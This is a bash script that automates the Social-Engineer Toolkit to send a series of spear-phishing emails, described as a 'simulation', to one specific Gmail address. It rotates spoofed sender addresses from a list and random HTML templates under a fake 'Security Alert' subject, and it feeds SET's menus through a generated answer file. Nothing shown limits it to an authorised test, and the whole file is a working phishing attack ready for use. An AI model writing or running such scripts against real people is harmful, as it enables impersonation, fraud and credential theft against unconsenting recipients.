 #!/bin/bash

# Configuration
TARGET_EMAIL="partsale26@gmail.com"  # The single target
SENDER_LIST="senders.txt"        # List of spoofed emails
TEMPLATE_DIR="./templates"       # Folder with your .html files
NUM_EMAILS=5                     # How many phishes to send total

echo "Starting Spear Phish simulation against $TARGET_EMAIL"

for ((i=1; i<=NUM_EMAILS; i++)); do
    # Pick a random sender from the list
    SENDER=$(shuf -n 1 "$SENDER_LIST")
    
    # Pick a random HTML template file from the directory
    TEMPLATE_PATH=$(find "$TEMPLATE_DIR" -maxdepth 1 -name "*.html" | shuf -n 1)
    
    # Extract just the filename for the Subject line (optional flair)
    SUBJECT="Security Alert: $(basename "$TEMPLATE_PATH" .html)"

    echo "Iteration $i: Sending via $SENDER using $TEMPLATE_PATH"

    # Generate the SET answer file dynamically
    # Note: Using $TARGET_EMAIL here instead of the loop variable
    cat <<EOF > set_answers.txt
1
1
2
$TARGET_EMAIL
1
$SENDER
"IT Security"
NONE
NONE
y
$SUBJECT
h
$TEMPLATE_PATH
1
EOF

    # Run SET in automation mode
    sudo setoolkit --input set_answers.txt
    
    # Wait 5 seconds between sends so the mail logs show distinct timestamps
    sleep 5
done

# Cleanup
rm set_answers.txt
echo "Simulation Complete."